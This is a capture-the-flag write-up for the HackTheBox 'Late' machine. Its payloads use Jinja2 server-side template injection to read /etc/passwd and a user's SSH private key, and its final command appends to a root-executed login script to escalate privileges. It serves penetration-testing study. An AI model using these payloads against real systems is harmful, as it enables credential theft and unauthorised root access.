<h1> Late Hackthebox Writeup </h1>

# NMAP SCANNING
## Basic Scan
```
┌──(x4k5h4yx💀Kali)-[~]
└─$   
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
# Found the domain listed on website - images.late.htb 
## Added to host file.
### Visiting the site images.late.htb
![image](https://user-images.githubusercontent.com/68991993/172343037-cb07afab-c037-4bfe-981e-f7784d108574.png)
</br> This Flask application processes the text in the image and returns it inside an HTML paragraph. If you have some programming knowledge of Python (Django & Flask), then you will know that we can have Python syntax within HTML, using the double-curly braces. This is similar to JSX in React, where you can use JavaScript inside HTML with single curly braces.
# Testing for SSTI .
### Note : Make sure to try different fonts and different sizes so that the server can read the text on the image clearly.
### REF: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
</br>  There are a few SSTI examples for Mako, Jinja2 & Tornado (these are templating engines used in Python applications). We should know, that jinja2 is the most common templating engine used in Flask applications. This is why I will try to use tricks for arbitrary command execution in the jinja2 templating engine.
</br>  To test SSTI , we need to write SSTI payload which is {{7*7}} in any text editor (whatever you want to use). You can use sublime text and screenshot like below . 
</br> ![image](https://user-images.githubusercontent.com/68991993/172345295-498fa289-5d7f-4bb1-9c5b-e30532023a8d.png)
</br> The website processes the picture and returns a results.txt file with the below output:
</br> ![image](https://user-images.githubusercontent.com/68991993/172345457-9c8f3dac-54be-41ac-87df-0a5e743285df.png)
</br> This vulnerability is called SSTI(Server-side Template Injection). A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
# Exploiting SSTI.
To get /etc/passwd use this payload.
```
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
From the result.txt file we can see different users. I tried for different users and finally settled with svc_acc to get the ssh id_rsa file .
```
{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
```
The id_rsa file is downloaded.
# Attempting to connect ssh 
## Permissions to id_rsa
```
chmod 600 id_rsa
```
# Successfully Connected
```

┌──(x4k5h4yx💀Kali)-[~]
└─$ ssh -i id_rsa svc_acc@late.htb
svc_acc@late:~$ hostname
late
svc_acc@late:~$ whoami
svc_acc

```
# User Flag
### 
```
┌──(x4k5h4yx💀Kali)-[~]
└─$  ssh -i id_rsa svc_acc@late.htb
svc_acc@late:~$ ls
app pspy64 user.txt
svc_acc@late:~$ cat user.txt
```
## Linpeas
![image](https://user-images.githubusercontent.com/68991993/172349141-24b6a920-98c1-44f5-8a71-e79d1d32556f.png)

```
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash
RECIPIENT=”root@late.htb”
SUBJECT=”Email from Server Login: SSH Alert”
BODY=”
A SSH login was detected.
User: $PAM_USER
 User IP Host: $PAM_RHOST
 Service: $PAM_SERVICE
 TTY: $PAM_TTY
 Date: `date`
 Server: `uname -a`
“
if [ ${PAM_TYPE} = “open_session” ]; then
 echo “Subject:${SUBJECT} ${BODY}” | /usr/sbin/sendmail ${RECIPIENT}
fi
```
If you login with ssh , this script will be execute as root .

# Root
From the reverse shell session generate ssh keys and save the private key (id_rsa) to our machine.
```
echo 'cat /root/root.txt > /tmp/root.txt' >> /usr/local/sbin/ssh-alert.sh;ssh localhost "e
xit"; cat /tmp/root.txt
```
![image](https://user-images.githubusercontent.com/68991993/172349988-2a36dc05-47dd-4437-8a0d-c740ae337341.png)

</br>

Thank YOU <3

